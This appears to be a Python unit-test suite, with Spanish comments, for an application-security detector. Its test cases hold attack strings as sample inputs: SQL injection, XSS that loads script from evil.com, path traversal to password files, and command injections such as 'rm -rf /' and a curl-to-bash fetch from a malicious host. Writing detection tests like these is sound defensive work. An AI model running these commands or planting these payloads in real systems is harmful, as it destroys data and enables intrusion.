"""
Test Suite Especializado para IAST (Interactive Application Security Testing)
=============================================================================

Tests completos para detector de vulnerabilidades web y de aplicaciones.
Incluye tests para SQL injection, XSS, command injection, buffer overflows, etc.
"""

import unittest
import sys
import os
import tempfile
import threading
import time
import json

# Agregar el directorio raíz al path
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from plugins.detectors.iast_detector.iast_detector import IASTDetector, IASTVulnerability

class TestIASTDetector(unittest.TestCase):
    """Tests para el detector IAST principal"""
    
    def setUp(self):
        """Configuración inicial para cada test"""
        self.detector = IASTDetector()
    
    def tearDown(self):
        """Limpieza después de cada test"""
        if self.detector.is_active:
            self.detector.stop()
    
    def test_detector_initialization(self):
        """Test: El detector se inicializa correctamente"""
        self.assertFalse(self.detector.is_active)
        self.assertEqual(len(self.detector.vulnerabilities), 0)
        self.assertIsNotNone(self.detector.sql_injection_patterns)
        self.assertIsNotNone(self.detector.xss_patterns)
        self.assertIsNotNone(self.detector.command_injection_patterns)
        self.assertIsNotNone(self.detector.path_traversal_patterns)
    
    def test_detector_start_stop(self):
        """Test: El detector puede iniciarse y detenerse correctamente"""
        # Test start
        result = self.detector.start()
        self.assertTrue(result)
        self.assertTrue(self.detector.is_active)
        
        # Test stop
        result = self.detector.stop()
        self.assertTrue(result)
        self.assertFalse(self.detector.is_active)
    
    def test_vulnerability_creation(self):
        """Test: Se pueden crear vulnerabilidades correctamente"""
        vuln = IASTVulnerability(
            vuln_type="SQL_INJECTION",
            severity="HIGH",
            description="Test SQL injection",
            location="test_location",
            evidence={"test": "data"}
        )
        
        self.assertEqual(vuln.vuln_type, "SQL_INJECTION")
        self.assertEqual(vuln.severity, "HIGH")
        self.assertEqual(vuln.description, "Test SQL injection")
        self.assertEqual(vuln.location, "test_location")
        self.assertIsInstance(vuln.evidence, dict)
        self.assertIsInstance(vuln.timestamp, float)
    
    def test_get_statistics(self):
        """Test: Las estadísticas se obtienen correctamente"""
        stats = self.detector.get_statistics()
        
        self.assertIsInstance(stats, dict)
        self.assertIn("total_vulnerabilities", stats)
        self.assertIn("by_severity", stats)
        self.assertIn("by_type", stats)
        self.assertIn("is_active", stats)
        self.assertIn("patterns_loaded", stats)

class TestSQLInjectionDetection(unittest.TestCase):
    """Tests específicos para detección de SQL Injection"""
    
    def setUp(self):
        self.detector = IASTDetector()
    
    def test_basic_sql_injection_patterns(self):
        """Test: Detecta patrones básicos de SQL injection"""
        sql_injections = [
            "SELECT * FROM users WHERE id = 1 OR 1=1",
            "admin'; DROP TABLE users; --",
            "' UNION SELECT password FROM users --",
            "1' AND 1=1 --",
            "admin' OR 'x'='x",
            "'; INSERT INTO users VALUES ('hacker', 'pass'); --"
        ]
        
        for injection in sql_injections:
            # Simular análisis de proceso con SQL injection
            proc_info = {
                'pid': 1234,
                'name': 'test_app.exe',
                'cmdline': [injection]
            }
            
            self.detector._analyze_process_for_vulns(proc_info)
        
        # Verificar que se detectaron vulnerabilidades
        vulns = self.detector.get_vulnerabilities("HIGH")
        self.assertGreater(len(vulns), 0)
        
        # Verificar que son de tipo SQL_INJECTION
        sql_vulns = [v for v in vulns if v['type'] == 'SQL_INJECTION']
        self.assertGreater(len(sql_vulns), 0)
    
    def test_advanced_sql_injection_patterns(self):
        """Test: Detecta patrones avanzados de SQL injection"""
        advanced_injections = [
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "admin' OR (SELECT user FROM users WHERE user='admin') = 'admin' --",
            "1'; EXEC xp_cmdshell('dir'); --",
            "1' AND ascii(substring((SELECT database()),1,1)) > 64 --"
        ]
        
        for injection in advanced_injections:
            proc_info = {
                'pid': 5678,
                'name': 'web_app.exe', 
                'cmdline': [injection]
            }
            
            self.detector._analyze_process_for_vulns(proc_info)
        
        vulns = self.detector.get_vulnerabilities("HIGH")
        sql_vulns = [v for v in vulns if v['type'] == 'SQL_INJECTION']
        self.assertGreater(len(sql_vulns), 0)

class TestXSSDetection(unittest.TestCase):
    """Tests específicos para detección de XSS"""
    
    def setUp(self):
        self.detector = IASTDetector()
    
    def test_script_based_xss(self):
        """Test: Detecta XSS basado en scripts"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script src='http://evil.com/xss.js'></script>",
            "<script>document.cookie='stolen'</script>",
            "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
        ]
        
        for payload in xss_payloads:
            proc_info = {
                'pid': 9999,
                'name': 'browser.exe',
                'cmdline': [payload]
            }
            
            self.detector._analyze_process_for_vulns(proc_info)
        
        vulns = self.detector.get_vulnerabilities("MEDIUM")
        xss_vulns = [v for v in vulns if v['type'] == 'XSS']
        self.assertGreater(len(xss_vulns), 0)
    
    def test_event_handler_xss(self):
        """Test: Detecta XSS en event handlers"""
        xss_handlers = [
            "onload='alert(1)'",
            "onclick=\"javascript:alert('XSS')\"",
            "onmouseover='window.location=\"http://evil.com\"'",
            "onerror='eval(atob(\"YWxlcnQoJ1hTUycpOw==\"))'"
        ]
        
        for handler in xss_handlers:
            proc_info = {
                'pid': 8888,
                'name': 'web_browser.exe',
                'cmdline': [handler]
            }
            
            self.detector._analyze_process_for_vulns(proc_info)
        
        vulns = self.detector.get_vulnerabilities()
        xss_vulns = [v for v in vulns if v['type'] == 'XSS']
        self.assertGreater(len(xss_vulns), 0)

class TestCommandInjectionDetection(unittest.TestCase):
    """Tests específicos para detección de Command Injection"""
    
    def setUp(self):
        self.detector = IASTDetector()
    
    def test_basic_command_injection(self):
        """Test: Detecta inyección de comandos básica"""
        command_injections = [
            "; ls -la",
            "&& whoami",
            "| cat /etc/passwd",
            "; rm -rf /",
            "&& net user hacker password123 /add"
        ]
        
        for injection in command_injections:
            proc_info = {
                'pid': 7777,
                'name': 'system_app.exe',
                'cmdline': [injection]
            }
            
            self.detector._analyze_process_for_vulns(proc_info)
        
        vulns = self.detector.get_vulnerabilities("CRITICAL")
        cmd_vulns = [v for v in vulns if v['type'] == 'COMMAND_INJECTION']
        self.assertGreater(len(cmd_vulns), 0)
    
    def test_backtick_command_injection(self):
        """Test: Detecta inyección con backticks"""
        backtick_injections = [
            "`whoami`",
            "`cat /etc/shadow`",
            "`ping -c 4 evil.com`",
            "`curl http://malicious.com/shell.sh | bash`"
        ]
        
        for injection in backtick_injections:
            proc_info = {
                'pid': 6666,
                'name': 'vulnerable_app.exe',
                'cmdline': [injection]
            }
            
            self.detector._analyze_process_for_vulns(proc_info)
        
        vulns = self.detector.get_vulnerabilities("CRITICAL")
        cmd_vulns = [v for v in vulns if v['type'] == 'COMMAND_INJECTION']
        self.assertGreater(len(cmd_vulns), 0)

class TestPathTraversalDetection(unittest.TestCase):
    """Tests específicos para detección de Path Traversal"""
    
    def setUp(self):
        self.detector = IASTDetector()
    
    def test_directory_traversal(self):
        """Test: Detecta directory traversal"""
        traversal_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//shadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for attack in traversal_attacks:
            proc_info = {
                'pid': 5555,
                'name': 'file_server.exe',
                'cmdline': [attack]
            }
            
            self.detector._analyze_process_for_vulns(proc_info)
        
        vulns = self.detector.get_vulnerabilities("MEDIUM")
        path_vulns = [v for v in vulns if v['type'] == 'PATH_TRAVERSAL']
        self.assertGreater(len(path_vulns), 0)

class TestLogFileAnalysis(unittest.TestCase):
    """Tests para análisis de archivos de log"""
    
    def setUp(self):
        self.detector = IASTDetector()
        self.temp_log_file = None
    
    def tearDown(self):
        if self.temp_log_file:
            try:
                os.unlink(self.temp_log_file.name)
            except:
                pass
    
    def test_log_file_analysis(self):
        """Test: Analiza archivos de log correctamente"""
        # Crear archivo de log temporal con contenido malicioso
        with tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False) as f:
            self.temp_log_file = f
            
            # Escribir entradas de log con ataques
            log_entries = [
                "2023-01-01 12:00:01 GET /index.php?id=1' OR '1'='1 HTTP/1.1 200",
                "2023-01-01 12:00:02 POST /login.php admin'; DROP TABLE users; -- HTTP/1.1 500",
                "2023-01-01 12:00:03 GET /page.php?file=../../../etc/passwd HTTP/1.1 403",
                "2023-01-01 12:00:04 POST /comment.php <script>alert('XSS')</script> HTTP/1.1 200",
                "2023-01-01 12:00:05 GET /cmd.php?exec=; rm -rf / HTTP/1.1 500"
            ]
            
            for entry in log_entries:
                f.write(entry + '\n')
        
        # Analizar el archivo
        self.detector._analyze_log_file(self.temp_log_file.name)
        
        # Verificar que se detectaron vulnerabilidades
        vulns = self.detector.get_vulnerabilities()
        self.assertGreater(len(vulns), 0)
        
        # Verificar tipos de vulnerabilidades
        vuln_types = [v['type'] for v in vulns]
        expected_types = ['SQL_INJECTION', 'XSS', 'PATH_TRAVERSAL', 'COMMAND_INJECTION']
        
        for expected_type in expected_types:
            self.assertIn(expected_type, vuln_types)

class TestNetworkConnectionAnalysis(unittest.TestCase):
    """Tests para análisis de conexiones de red"""
    
    def setUp(self):
        self.detector = IASTDetector()
    
    def test_suspicious_port_detection(self):
        """Test: Detecta conexiones a puertos sospechosos"""
        # Mock de conexión sospechosa
        class MockConnection:
            def __init__(self, ip, port):
                self.raddr = type('raddr', (), {'ip': ip, 'port': port})()
        
        suspicious_connections = [
            MockConnection('192.168.1.100', 4444),  # Puerto comúnmente usado por malware
            MockConnection('10.0.0.50', 31337),     # Puerto leet speak
            MockConnection('172.16.0.10', 6666),    # Puerto sospechoso
        ]
        
        for conn in suspicious_connections:
            self.detector._analyze_network_connection(conn)
        
        vulns = self.detector.get_vulnerabilities()
        suspicious_vulns = [v for v in vulns if v['type'] == 'SUSPICIOUS_CONNECTION']
        self.assertGreater(len(suspicious_vulns), 0)

class TestIASTIntegration(unittest.TestCase):
    """Tests de integración para IAST"""
    
    def setUp(self):
        self.detector = IASTDetector()
    
    def test_full_monitoring_cycle(self):
        """Test: Ciclo completo de monitoreo funciona correctamente"""
        # Iniciar detector
        result = self.detector.start()
        self.assertTrue(result)
        
        # Esperar un poco para que el monitoreo funcione
        time.sleep(2)
        
        # Verificar que está funcionando
        self.assertTrue(self.detector.is_active)
        
        # Obtener estadísticas
        stats = self.detector.get_statistics()
        self.assertIsInstance(stats, dict)
        self.assertTrue(stats['is_active'])
        
        # Detener detector
        result = self.detector.stop()
        self.assertTrue(result)
        self.assertFalse(self.detector.is_active)
    
    def test_vulnerability_reporting(self):
        """Test: El sistema de reportes de vulnerabilidades funciona"""
        # Crear vulnerabilidad de prueba
        test_vuln = IASTVulnerability(
            vuln_type="TEST_VULNERABILITY",
            severity="HIGH",
            description="Test vulnerability for reporting",
            location="test_location",
            evidence={"test_data": "example"}
        )
        
        # Reportar vulnerabilidad
        self.detector._report_vulnerability(test_vuln)
        
        # Verificar que se guardó
        vulns = self.detector.get_vulnerabilities()
        self.assertEqual(len(vulns), 1)
        
        vuln = vulns[0]
        self.assertEqual(vuln['type'], 'TEST_VULNERABILITY')
        self.assertEqual(vuln['severity'], 'HIGH')
        self.assertEqual(vuln['description'], 'Test vulnerability for reporting')
    
    def test_vulnerability_filtering(self):
        """Test: El filtrado de vulnerabilidades por severidad funciona"""
        # Crear vulnerabilidades con diferentes severidades
        severities = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
        
        for i, severity in enumerate(severities):
            vuln = IASTVulnerability(
                vuln_type=f"TEST_{severity}",
                severity=severity,
                description=f"Test {severity} vulnerability",
                location=f"test_location_{i}",
                evidence={"test": f"data_{i}"}
            )
            self.detector._report_vulnerability(vuln)
        
        # Verificar filtrado por severidad
        for severity in severities:
            filtered_vulns = self.detector.get_vulnerabilities(severity)
            self.assertEqual(len(filtered_vulns), 1)
            self.assertEqual(filtered_vulns[0]['severity'], severity)
        
        # Verificar que sin filtro se obtienen todas
        all_vulns = self.detector.get_vulnerabilities()
        self.assertEqual(len(all_vulns), len(severities))

def run_all_iast_tests():
    """Ejecuta todos los tests de IAST"""
    # Crear test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Agregar todas las clases de test
    test_classes = [
        TestIASTDetector,
        TestSQLInjectionDetection,
        TestXSSDetection,
        TestCommandInjectionDetection,
        TestPathTraversalDetection,
        TestLogFileAnalysis,
        TestNetworkConnectionAnalysis,
        TestIASTIntegration
    ]
    
    for test_class in test_classes:
        suite.addTests(loader.loadTestsFromTestCase(test_class))
    
    # Ejecutar tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    return result.wasSuccessful()

if __name__ == '__main__':
    print("🛡️ EJECUTANDO TESTS IAST ESPECIALIZADO")
    print("=" * 60)
    
    success = run_all_iast_tests()
    
    if success:
        print("\n✅ TODOS LOS TESTS IAST PASARON")
        print("🎉 Sistema IAST listo para producción")
    else:
        print("\n❌ ALGUNOS TESTS IAST FALLARON")
        print("⚠️ Revisar implementación antes de usar en producción")
    
    exit(0 if success else 1)